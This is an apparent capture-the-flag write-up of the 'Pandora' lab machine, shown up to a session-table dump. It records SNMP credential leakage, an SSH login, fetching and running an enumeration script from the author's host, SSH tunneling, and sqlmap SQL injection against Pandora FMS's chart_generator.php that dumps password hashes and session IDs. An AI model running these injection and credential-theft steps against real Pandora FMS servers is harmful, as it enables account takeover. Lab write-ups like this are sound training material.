+<h1 id="wfuzz"><a href="#wfuzz" class="headerlink" title="wfuzz"></a>wfuzz</h1><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">wfuzz --sc 200 -w Documents&#x2F;wordlist&#x2F;directory-list-2.3-medium.txt http:&#x2F;&#x2F;pandora.htb&#x2F;FUZZ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Nothing, same for the subdoimains.</p>
+<h1 id="nmap-n°2"><a href="#nmap-n°2" class="headerlink" title="nmap n°2"></a>nmap n°2</h1><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sudo nmap -sU --min-rate 100 pandora.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">PORT      STATE  SERVICE
+161&#x2F;udp   open   snmp
+19283&#x2F;udp closed keysrvr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>let’s see what we can do with snmp</p>
+<h1 id="Matasploit"><a href="#Matasploit" class="headerlink" title="Matasploit"></a>Matasploit</h1><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">msfconsole
+use auxiliary&#x2F;scanner&#x2F;snmp&#x2F;snmp_enum
+show options 
+set rhost 10.10.11.136<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p><img src="https://i.imgur.com/mcpb6dK.png"><br>This is so cool, I can see every process, there is lot off hackers in the box.<br><img src="https://i.imgur.com/bOTP7Qe.png"></p>
+<p>/usr/bin/host_check -u daniel -p HotelBabylon23</p>
+<h1 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h1><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">ssh daniel@pandora.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<h1 id="lse"><a href="#lse" class="headerlink" title="lse"></a>lse</h1><p><img src="https://i.imgur.com/IVbKPL4.png"><br>on My computer in my script directory</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">python2.7 -m SimpleHTTPServer<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>on the target</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">wget http:&#x2F;&#x2F;10.10.15.22:8000&#x2F;lse.sh
+chmod +x lse.sh
+.&#x2F;lse.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;( file system )&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;
+[*] fst000 Writable files outside user&#39;s home.............................. yes!
+[*] fst010 Binaries with setuid bit........................................ yes!
+[!] fst020 Uncommon setuid binaries........................................ yes!
+---
+&#x2F;usr&#x2F;bin&#x2F;pandora_backup
+---<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<h1 id="pownkit"><a href="#pownkit" class="headerlink" title="pownkit"></a>pownkit</h1><p><img src="https://i.imgur.com/Bk4gsvA.png"></p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">root         960  0.0  0.2 236420  8932 ?        Ssl  10:00   0:00 &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkitd --no-debug<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="https://imgflip.com/s/meme/Heavy-Breathing-Cat.jpg"><br>I have to resist!!!</p>
+<h1 id="pandora-backup"><a href="#pandora-backup" class="headerlink" title="pandora_backup"></a>pandora_backup</h1><p><img src="https://i.imgur.com/KAQW2JG.png"><br>I have to pwn matt first.</p>
+<h1 id="linPEAS"><a href="#linPEAS" class="headerlink" title="linPEAS"></a>linPEAS</h1><p><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a><br><img src="https://i.imgur.com/fLklauz.png"><br>I’m not supposed to use this exploit…<br>I can do it to get the frre flags but it’m not a cheater.</p>
+<p>I have other open ports.<br><img src="https://i.imgur.com/lduSgbN.png"></p>
+<p><img src="https://i.imgur.com/5QHok7i.png"><br>Interesting files<br><img src="https://i.imgur.com/GYWGrnq.pn"><br>Mysql user:<br><img src="https://i.imgur.com/ka2uqGD.png"></p>
+<h1 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h1><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">nmap -sV -p- 127.0.0.1
+
+PORT     STATE SERVICE VERSION
+22&#x2F;tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80&#x2F;tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
+3306&#x2F;tcp open  mysql   MySQL 5.5.5-10.3.32-MariaDB-0ubuntu0.20.04.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>I don’t have the creds</p>
+<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>I wanted to browse pandora.panda.htb:<br><img src="https://i.imgur.com/sLTVklz.png"><br>it’s in my /etc/hosts but it’s not working, so tryed to do it via ssh with curl.</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">curl pandora.panda.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Same problem, let’s see his /etc/hosts</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">daniel@pandora:&#x2F;tmp&#x2F;dir$ cat &#x2F;etc&#x2F;hosts
+127.0.0.1 localhost.localdomain pandora.htb pandora.pandora.htb
+127.0.1.1 pandora<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>127.0.0.1 pandora is the website I saw on the port 80,<br>I think 127.0.0.1 work only on localhost.</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">daniel@pandora:&#x2F;tmp&#x2F;dir$ curl pandora.pandora.htb
+&lt;meta HTTP-EQUIV&#x3D;&quot;REFRESH&quot; content&#x3D;&quot;0; url&#x3D;&#x2F;pandora_console&#x2F;&quot;&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>Yesss!!!!<br>Now I have to find a way to se in on my browser.</p>
+<h2 id="Web-tunneling"><a href="#Web-tunneling" class="headerlink" title="Web tunneling"></a>Web tunneling</h2><p><a href="https://www.it-connect.fr/chapitres/tunneling-ssh/">https://www.it-connect.fr/chapitres/tunneling-ssh/</a><br>It’s french but it’s good!</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">ssh -f daniel@pandora.htb -L 2500:localhost:80 -N<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>Boom!</p>
+<p><img src="https://i.imgur.com/gRdjheN.png"><br>Where is the password… what is the username…(╯°□°）╯︵ ┻━┻)<br><img src="https://i.imgur.com/FfeEqxp.png"><br>Oh no I have to be fast. </p>
+<h1 id="Connnect-with-daniel"><a href="#Connnect-with-daniel" class="headerlink" title="Connnect with daniel"></a>Connnect with daniel</h1><p>I was trying to connect with daniel.<br>Ihave this error:<br><img src="https://i.imgur.com/1xNxtp3.png"><br>It’s good, I have to use the API.</p>
+<h1 id="Browsing-the-files"><a href="#Browsing-the-files" class="headerlink" title="Browsing the files"></a>Browsing the files</h1><p>In <code>/var/www/pandora/pandora_console</code></p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">cat pandoradb.sql |grep pass<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">	<span class="token punctuation">`</span>plugin_pass<span class="token punctuation">`</span> <span class="token keyword">text</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>password<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token string">''</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>password<span class="token punctuation">`</span> <span class="token keyword">text</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>snmp_auth_pass<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">default</span> <span class="token string">''</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>snmp_privacy_pass<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">255</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">default</span> <span class="token string">''</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>plugin_pass<span class="token punctuation">`</span> <span class="token keyword">text</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>password<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>force_change_pass<span class="token punctuation">`</span> <span class="token keyword">tinyint</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">default</span> <span class="token number">0</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>last_pass_change<span class="token punctuation">`</span> <span class="token keyword">DATETIME</span>  <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">DEFAULT</span> <span class="token number">0</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>ehorus_user_level_pass<span class="token punctuation">`</span> <span class="token keyword">VARCHAR</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
+<span class="token comment">-- Table `treset_pass_history`</span>
+<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> <span class="token punctuation">`</span>treset_pass_history<span class="token punctuation">`</span> <span class="token punctuation">(</span>
+<span class="token comment">-- "pass_opt" are deprecated for the 5.1.</span>
+	<span class="token punctuation">`</span>pass_opt<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token string">''</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>pass<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">default</span> <span class="token string">''</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>is_password_type<span class="token punctuation">`</span> <span class="token keyword">tinyint</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">default</span> <span class="token number">0</span><span class="token punctuation">,</span>
+<span class="token comment">-- Table `tpassword_history`</span>
+<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> <span class="token punctuation">`</span>tpassword_history<span class="token punctuation">`</span> <span class="token punctuation">(</span>
+	<span class="token punctuation">`</span>id_pass<span class="token punctuation">`</span>  <span class="token keyword">int</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">unsigned</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span> <span class="token keyword">auto_increment</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>password<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
+	<span class="token keyword">PRIMARY</span> <span class="token keyword">KEY</span>  <span class="token punctuation">(</span><span class="token punctuation">`</span>id_pass<span class="token punctuation">`</span><span class="token punctuation">)</span>
+	<span class="token punctuation">`</span>plugin_pass<span class="token punctuation">`</span> <span class="token keyword">text</span> <span class="token keyword">default</span> <span class="token string">''</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>password<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token string">''</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>password<span class="token punctuation">`</span> <span class="token keyword">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">default</span> <span class="token string">''</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>dbpass<span class="token punctuation">`</span> <span class="token keyword">text</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>meta_dbpass<span class="token punctuation">`</span> <span class="token keyword">text</span><span class="token punctuation">,</span>
+	<span class="token punctuation">`</span>api_password<span class="token punctuation">`</span> <span class="token keyword">text</span> <span class="token operator">NOT</span> <span class="token boolean">NULL</span><span class="token punctuation">,</span>
+<span class="token keyword">CREATE</span> <span class="token keyword">TABLE</span> <span class="token keyword">IF</span> <span class="token operator">NOT</span> <span class="token keyword">EXISTS</span> <span class="token punctuation">`</span>treset_pass<span class="token punctuation">`</span> <span class="token punctuation">(</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">cat DB_Dockerfile <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">FROM mysql:5.5
+MAINTAINER Pandora FMS Team &lt;info@pandorafms.com&gt;
+
+WORKDIR &#x2F;pandorafms&#x2F;pandora_console
+
+ADD pandoradb.sql &#x2F;docker-entrypoint-initdb.d
+ADD pandoradb_data.sql &#x2F;docker-entrypoint-initdb.d
+RUN chown mysql &#x2F;docker-entrypoint-initdb.d
+
+ENV MYSQL_DATABASE&#x3D;pandora
+
+RUN echo &quot; \n\
+sed -i \&quot;1iUSE \$MYSQL_DATABASE\&quot; &#x2F;docker-entrypoint-initdb.d&#x2F;pandoradb.sql \n\
+sed -i \&quot;1iUSE \$MYSQL_DATABASE\&quot; &#x2F;docker-entrypoint-initdb.d&#x2F;pandoradb_data.sql \n\
+&quot; &gt;&gt; &#x2F;docker-entrypoint-initdb.d&#x2F;create_pandoradb.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>Dbmane=”pandora”<br>Table=”tpassword_history”<br>This website show where we can exploit.<br><a href="https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained">https://blog.sonarsource.com/pandora-fms-742-critical-code-vulnerabilities-explained</a></p>
+<h1 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h1><p>I don’t use sqlmap very often, that’s why I had lot of trouble.</p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php&quot; -D pandora
+
+[20:44:13] [CRITICAL] no parameter(s) found for testing in the provided data (e.g. GET parameter &#39;id&#39; in &#39;www.site.com&#x2F;index.php?id&#x3D;1&#39;). You are advised to rerun with &#39;--crawl&#x3D;2&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?id&#x3D;&#39;&#39;&quot; -D pandora --tables
+
+[20:45:33] [WARNING] GET parameter &#39;id&#39; does not seem to be injectable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>Now I have to find out what I have to use instead if ‘id’.<br><img src="https://i.imgur.com/g5qEfwf.png"></p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;&#39;&#39;&quot; -D pandora
+
+[20:47:42] [WARNING] potential permission problems detected (&#39;Access denied&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>I have an another error, it’s good.<br>This is a cheat sheet:<br><a href="https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet">https://www.security-sleuth.com/sleuth-blog/2017/1/3/sqlmap-cheat-sheet</a></p>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;&#39;&#39;&quot;  -D pandora -T tpassword_history --dump
+
++---------+---------+---------------------+----------------------------------+---------------------+
+| id_pass | id_user | date_end            | password                         | date_begin          |
++---------+---------+---------------------+----------------------------------+---------------------+
+| 1       | matt    | 0000-00-00 00:00:00 | f655f807365b6dc602b31ab3d6d43acc | 2021-06-11 17:28:54 |
+| 2       | daniel  | 0000-00-00 00:00:00 | 76323c174bd49ffbbdedf678f6cc89a6 | 2021-06-17 00:11:54 |
++---------+---------+---------------------+----------------------------------+---------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h2 id="list-of-tables"><a href="#list-of-tables" class="headerlink" title="list of tables"></a>list of tables</h2><pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;&#39;&#39;&quot; -D pandora --tables
+
+[178 tables]
++------------------------------------+
+| taddress                           |
+| taddress_agent                     |
+| tagent_access                      |
+| tagent_custom_data                 |
+| tagent_custom_fields               |
+| tagent_custom_fields_filter        |
+| tagent_module_inventory            |
+| tagent_module_log                  |
+| tagent_repository                  |
+| tagent_secondary_group             |
+| tagente                            |
+| tagente_datos                      |
+| tagente_datos_inc                  |
+| tagente_datos_inventory            |
+| tagente_datos_log4x                |
+| tagente_datos_string               |
+| tagente_estado                     |
+| tagente_modulo                     |
+| talert_actions                     |
+| talert_commands                    |
+| talert_snmp                        |
+| talert_snmp_action                 |
+| talert_special_days                |
+| talert_template_module_actions     |
+| talert_template_modules            |
+| talert_templates                   |
+| tattachment                        |
+| tautoconfig                        |
+| tautoconfig_actions                |
+| tautoconfig_rules                  |
+| tcategory                          |
+| tcluster                           |
+| tcluster_agent                     |
+| tcluster_item                      |
+| tcollection                        |
+| tconfig                            |
+| tconfig_os                         |
+| tcontainer                         |
+| tcontainer_item                    |
+| tcredential_store                  |
+| tdashboard                         |
+| tdatabase                          |
+| tdeployment_hosts                  |
+| tevent_alert                       |
+| tevent_alert_action                |
+| tevent_custom_field                |
+| tevent_extended                    |
+| tevent_filter                      |
+| tevent_response                    |
+| tevent_rule                        |
+| tevento                            |
+| textension_translate_string        |
+| tfiles_repo                        |
+| tfiles_repo_group                  |
+| tgis_data_history                  |
+| tgis_data_status                   |
+| tgis_map                           |
+| tgis_map_connection                |
+| tgis_map_has_tgis_map_con          |
+| tgis_map_layer                     |
+| tgis_map_layer_groups              |
+| tgis_map_layer_has_tagente         |
+| tgraph                             |
+| tgraph_source                      |
+| tgraph_source_template             |
+| tgraph_template                    |
+| tgroup_stat                        |
+| tgrupo                             |
+| tincidencia                        |
+| titem                              |
+| tlanguage                          |
+| tlayout                            |
+| tlayout_data                       |
+| tlayout_template                   |
+| tlayout_template_data              |
+| tlink                              |
+| tlocal_component                   |
+| tlog_graph_models                  |
+| tmap                               |
+| tmensajes                          |
+| tmetaconsole_agent                 |
+| tmetaconsole_agent_secondary_group |
+| tmetaconsole_event                 |
+| tmetaconsole_event_history         |
+| tmetaconsole_setup                 |
+| tmigration_module_queue            |
+| tmigration_queue                   |
+| tmodule                            |
+| tmodule_group                      |
+| tmodule_inventory                  |
+| tmodule_relationship               |
+| tmodule_synth                      |
+| tnetflow_filter                    |
+| tnetflow_report                    |
+| tnetflow_report_content            |
+| tnetwork_component                 |
+| tnetwork_component_group           |
+| tnetwork_map                       |
+| tnetwork_matrix                    |
+| tnetwork_profile                   |
+| tnetwork_profile_component         |
+| tnetworkmap_ent_rel_nodes          |
+| tnetworkmap_enterprise             |
+| tnetworkmap_enterprise_nodes       |
+| tnews                              |
+| tnota                              |
+| tnotification_group                |
+| tnotification_source               |
+| tnotification_source_group         |
+| tnotification_source_group_user    |
+| tnotification_source_user          |
+| tnotification_user                 |
+| torigen                            |
+| tpassword_history                  |
+| tperfil                            |
+| tphase                             |
+| tplanned_downtime                  |
+| tplanned_downtime_agents           |
+| tplanned_downtime_modules          |
+| tplugin                            |
+| tpolicies                          |
+| tpolicy_agents                     |
+| tpolicy_alerts                     |
+| tpolicy_alerts_actions             |
+| tpolicy_collections                |
+| tpolicy_groups                     |
+| tpolicy_modules                    |
+| tpolicy_modules_inventory          |
+| tpolicy_plugins                    |
+| tpolicy_queue                      |
+| tprofile_view                      |
+| tprovisioning                      |
+| tprovisioning_rules                |
+| trecon_script                      |
+| trecon_task                        |
+| trel_item                          |
+| tremote_command                    |
+| tremote_command_target             |
+| treport                            |
+| treport_content                    |
+| treport_content_item               |
+| treport_content_item_temp          |
+| treport_content_sla_com_temp       |
+| treport_content_sla_combined       |
+| treport_content_template           |
+| treport_custom_sql                 |
+| treport_template                   |
+| treset_pass                        |
+| treset_pass_history                |
+| tserver                            |
+| tserver_export                     |
+| tserver_export_data                |
+| tservice                           |
+| tservice_element                   |
+| tsesion                            |
+| tsesion_extended                   |
+| tsessions_php                      |
+| tskin                              |
+| tsnmp_filter                       |
+| ttag                               |
+| ttag_module                        |
+| ttag_policy_module                 |
+| ttipo_modulo                       |
+| ttransaction                       |
+| ttrap                              |
+| ttrap_custom_values                |
+| tupdate                            |
+| tupdate_journal                    |
+| tupdate_package                    |
+| tupdate_settings                   |
+| tuser_double_auth                  |
+| tuser_task                         |
+| tuser_task_scheduled               |
+| tusuario                           |
+| tusuario_perfil                    |
+| tvisual_console_elements_cache     |
+| twidget                            |
+| twidget_dashboard                  |
++------------------------------------+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-sh" data-language="sh"><code class="language-sh">sqlmap &quot;http:&#x2F;&#x2F;localhost:2500&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;&#39;&#39;&quot;  -D pandora -T tsessions_php --dump
+
++----------------------------+------------------------------------------------------+-------------+
+| id_session                 | data                                                 | last_active |
++----------------------------+------------------------------------------------------+-------------+
+| 07ou61d2jsi3087a9jg12s3m1k | NULL                                                 | 1644502695  |
+| 09vao3q1dikuoi1vhcvhcjjbc6 | id_usuario|s:6:&quot;daniel&quot;;                             | 1638783555  |
+| 0ahul7feb1l9db7ffp8d25sjba | NULL                                                 | 1638789018  |
+| 1t2n71opaqeoausmhaqk277c21 | id_usuario|s:6:&quot;daniel&quot;;                             | 1644502477  |
+| 1um23if7s531kqf5da14kf5lvm | NULL                                                 | 1638792211  |
+| 2e25c62vc3odbppmg6pjbf9bum | NULL                                                 | 1638786129  |
+| 346uqacafar8pipuppubqet7ut | id_usuario|s:6:&quot;daniel&quot;;                             | 1638540332  |
+| 3fq6hl9r8kbadgq6r5bfjmojm5 | NULL                                                 | 1644502325  |
+| 3me2jjab4atfa5f8106iklh4fc | NULL                                                 | 1638795380  |
+| 4f51mju7kcuonuqor3876n8o02 | NULL                                                 | 1638786842  |
+| 4nsbidcmgfoh1gilpv8p5hpi2s | id_usuario|s:6:&quot;daniel&quot;;                             | 1638535373  |
+| 59qae699l0971h13qmbpqahlls | NULL                                                 | 1638787305  |
+| 5fihkihbip2jioll1a8mcsmp6j | NULL                                                 | 1638792685  |
+| 5i352tsdh7vlohth30ve4o0air | id_usuario|s:6:&quot;daniel&quot;;                             | 1638281946  |
+| 69gbnjrc2q42e8aqahb1l2s68n | id_usuario|s:6:&quot;daniel&quot;;                             | 1641195617  |
+| 81f3uet7p3esgiq02d4cjj48rc | NULL                                                 | 1623957150  |
+| 8m2e6h8gmphj79r9pq497vpdre | id_usuario|s:6:&quot;daniel&quot;;                             | 1638446321  |
+| 8uiokruc91od5tphgekpsau4lp | alert_msg|a:0:&#123;&#125;new_chat|b:0;                        | 1644502812  |
+| 8upeameujo9nhki3ps0fu32cgd | NULL                                                 | 1638787267  |
+| 9vv4godmdam3vsq8pu78b52em9 | id_usuario|s:6:&quot;daniel&quot;;                             | 1638881787  |
+| a3a49kc938u7od6e6mlip1ej80 | NULL                                                 | 1638795315  |
+| agfdiriggbt86ep71uvm1jbo3f | id_usuario|s:6:&quot;daniel&quot;;                             | 1638881664  |
+| cojb6rgubs18ipb35b3f6hf0vp | NULL                                                 | 1638787213  |
+| d0carbrks2lvmb90ergj7jv6po | NULL                                                 | 1638786277  |
+| d0h8gpqrh99ur3pfcb53vqak5e | NULL                                                 | 1644513572  |
+| elks2rkjdnk8f001jqbkinael0 | NULL                                                 | 1644513405  |
+| eqsc2gjr37g0ug1q4qdk3rabh4 | id_usuario|s:5:&quot;admin&quot;;alert_msg|a:0:&#123;&#125;new_chat|b:0; | 1644502437  |
+| f0qisbrojp785v1dmm8cu1vkaj | id_usuario|s:6:&quot;daniel&quot;;                             | 1641200284  |
+| fikt9p6i78no7aofn74rr71m85 | NULL                                                 | 1638786504  |
+| fqd96rcv4ecuqs409n5qsleufi | NULL                                                 | 1638786762  |
+| g0kteepqaj1oep6u7msp0u38kv | id_usuario|s:6:&quot;daniel&quot;;                             | 1638783230  |
+| g4e01qdgk36mfdh90hvcc54umq | id_usuario|s:4:&quot;matt&quot;;alert_msg|a:0:&#123;&#125;new_chat|b:0;  | 1644512890  |
+| gf40pukfdinc63nm5lkroidde6 | NULL                                                 | 1638786349  |
+| h1ge39342hcid93s3ghk0nhl3c | NULL                                                 | 1644502501  |
+| heasjj8c48ikjlvsf1uhonfesv | NULL                                                 | 1638540345  |
+| hif1pavjlks18e7oqgu8bmvhis | NULL                                                 | 1644513371  |
+| hsftvg6j5m3vcmut6ln6ig8b0f | id_usuario|s:6:&quot;daniel&quot;;                             | 1638168492  |
+| j85l7a3q010b3ul6sv2eh6amo6 | NULL                                                 | 1644502455  |
+| jecd4v8f6mlcgn4634ndfl74rd | id_usuario|s:6:&quot;daniel&quot;;                             | 1638456173  |
+| kp90bu1mlclbaenaljem590ik3 | NULL                                                 | 1638787808  |
+| ne9rt4pkqqd0aqcrr4dacbmaq3 | NULL                                                 | 1638796348  |
+| o3kuq4m5t5mqv01iur63e1di58 | id_usuario|s:6:&quot;daniel&quot;;                             | 1638540482  |
+| oi2r6rjq9v99qt8q9heu3nulon | id_usuario|s:6:&quot;daniel&quot;;                             | 1637667827  |
